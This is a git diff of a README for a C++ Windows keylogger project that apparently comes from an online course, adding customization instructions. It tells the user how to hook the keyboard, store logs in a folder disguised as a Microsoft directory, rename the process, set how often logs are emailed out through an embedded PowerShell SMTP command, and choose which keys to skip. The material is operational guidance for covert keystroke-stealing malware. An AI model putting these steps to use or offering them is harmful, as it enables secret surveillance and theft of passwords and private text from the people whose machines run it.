@@ -15,15 +15,14 @@ If you would like to take the course yourself, check it out [here](https://www.u
     * Name of the process
     * Email to send from and send to
     * Time between each log file generation
-    * When to enable and disable the keyboard hooks
-    * Method of encryption used
     * Format which the keys are recorded
+    * Keys to exclude from recording
     
 ## Important Information
   * Log files by default are stored in C:\Users\($User)\AppData\Roaming\Microsoft\CLR
   * AppLog files are produced in the location when the keylogger is ran for debugging purposes
   * Problems may occur if the Keylogger in ran multiple times when one is still running
-  * Default name to look for in the task manager to end the keylogger is Keylogger.exe
+  * Default name to look for in the task manager to end the keylogger process is Keylogger.exe
 
 ### Prerequisites
 
@@ -60,7 +59,7 @@ located at ../Cpp-Keylogger/Keylogger
 ## Setting it up
 Listed below are various options the user can interact with the source code for their specific usage.
 
-### Email
+## Email
 Required if user wants the log to be sent to an email.
 
 Open SendMail.h
@@ -97,6 +96,55 @@ Edit line 39 with your email port number which can be searched up
 ```
 line 39: "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
 ```
+
+## Customization
+OPTIONAL changes the user can make to the source code to fit their needs.
+
+## Name
+The name of the process can simply be changed by renaming the .exe file of the built solution
+
+Build the solution
+```
+Build -> Build Solution
+The .exe file should be located by default in ../Cpp-Keylogger/Debug/Keylogger.exe
+```
+Rename the built Keylogger.exe file
+
+## Time
+Here, the user can set the interval at which each log file is created and sent
+
+Open KeybHook.h
+```
+located at ../Cpp-Keylogger/Keylogger/KeybHook.h
+```
+Edit line 36 with the desired time (default is 30 seconds)
+```
+line 36: Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite); // change the second argument to desired time (milliseconds)
+```
+## Format
+Here, the user can set how the log file formats the read keys
+
+Open Helper.h
+```
+located at ../Cpp-Keylogger/Keylogger/Helper.h
+```
+Edit lines 77 - 83 to change how single keys are formated
+```
+line 77: void WriteAppLog(const std::string &s) // function responsible for format of each key in log (default: [a][b][c])
+```
+
+## Key Exceptions
+Here, the user can exclude keys they don't want to be logged
+
+Open KeybHook.h
+```
+located at ../Cpp-Keylogger/Keylogger/KeybHook.h
+```
+Take a look at lines 40 - 72
+```
+line 40: LRESULT OurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam) // function responsible for reading and handling certain key presses
+```
+Add in necessary if statements and desired format when a certain key is pressed (ex: by default pressing enter inserts "\n" to the log)
 
 ### Configuring Other Emails
 Look up permissions respectively for your source email that allow less secure apps to access that source email.
